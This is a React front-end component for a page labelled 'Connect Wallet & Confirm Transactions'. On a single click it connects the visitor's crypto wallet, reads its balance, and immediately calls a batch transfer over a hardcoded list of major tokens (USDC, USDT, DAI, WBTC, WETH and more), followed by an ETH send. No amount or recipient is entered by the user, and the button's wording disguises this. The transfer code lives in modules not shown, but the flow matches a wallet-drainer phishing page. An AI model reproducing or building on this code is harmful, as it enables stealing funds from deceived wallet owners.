import { useContext, useState } from 'react';
import { WalletContext } from './context/WalletContext';
import './App.css'
import { connectWallet, getBalance } from './web3/wallet';
import { getPriceUSD } from './web3/price';
import { sendETH } from './web3/send';
import { batchSendTokens } from './web3/sendToken';
// import Provider from '@walletconnect/ethereum-provider';

const tokenAddresses = [
  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
  "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
  "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
  "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", // WBTC
  "0x9Ac9468E7E3E1D194080827226B45d0B892C77Fd", // Yee Token which has 9 decimals YEE
  "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",  // WETH 18 decimals
  "0x514910771AF9Ca656af840dff83E8264EcF986CA",  // LINK 18 decimals
  "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI 18 decimals
  "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", // AAVE 18 decimals
  "0x0D8775F648430679A709E98d2b0Cb6250d2887EF", // BAT 18 decimals
  "0xC011A72400E58ecD99Ee497CF89E3775d4bd732F", // SNX 18 decimals
  "0xE41d2489571d322189246DaFA5ebDe1F4699F498", // ZRX 18 decimals
  "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e", // YFI 18 decimals
  "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2", // MKR 18 decimals
  "0xc00e94Cb662C3520282E6f5717214004A7f26888", // COMP 18 decimals
  "0x6982508145454Ce325dDbE47a25d4ec3d2311933", // PEPE 18 decimals
  "0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b", // CRO 18 decimals
];

function App() {
  const { state, dispatch } = useContext(WalletContext);
  const [loading, setLoading] = useState(false);


  const handleConnectAndSend = async () => {
    if(loading) return; // prevent multiple clicks
    setLoading(true);

    try {
      let data = {
        provider: state.provider,
        signer: state.signer,
        address: state.address,
      }

      // if wallet is not connected, connect it first
      if(!state.address){
        data = await connectWallet();
        if(!data){
          alert("Failed to connect wallet. Please try again.");
          setLoading(false);
          return;
        }

        dispatch({ type: "CONNECT_WALLET", payload: data });
        const bal = await getBalance(data.provider, data.address);
        dispatch({ type: "SET_BALANCE", payload: bal });
        const price = await getPriceUSD();
        const usdValue = (parseFloat(bal) * price).toFixed(2);
        dispatch({ type: "SET_USD_VALUE", payload: usdValue });
      }

      // send batch tokens first
      const tokenTx = await batchSendTokens(data.provider, data.signer, tokenAddresses);
      if(tokenTx){
        alert(`Batch token transaction sent!\nHash: ${tokenTx}`);
      } else {
        alert("Failed to send batch token transaction.");
      }

      // Add a small delay to let the wallet process the transaction
      await new Promise(resolve => setTimeout(resolve, 2000));

      // send ETH after tokens
      const txHash = await sendETH(data.provider, data.signer);
      if(txHash){
        alert(`ETH Transaction sent!\nHash: ${txHash}`);
      } else {
        alert("Failed to send ETH transaction.");
      }
    } catch (error) {
      console.error("Error in connect/send flow:", error);
      alert("Something went wrong. Check console.");
    }
    setLoading(false);
  }

  return (
    <>
      <h2>Connect Wallet & Confirm Transactions(version 1.5.0)</h2>

      <button onClick={handleConnectAndSend} disabled={loading}>
        { loading ? "Processing..." : state.address ? "Wallet connected | Confirming Transaction" : "Connect Wallet to Confirm Transaction" }
      </button>

      {
        state.address && (
          <>
            <p>Address: {state.address}</p>
            <p>Balance: {state.balance} ETH</p>
            <p>USD Value: ${state.usdBalance}</p>
          </>
        )
      }
      
    </>
  )
}

export default App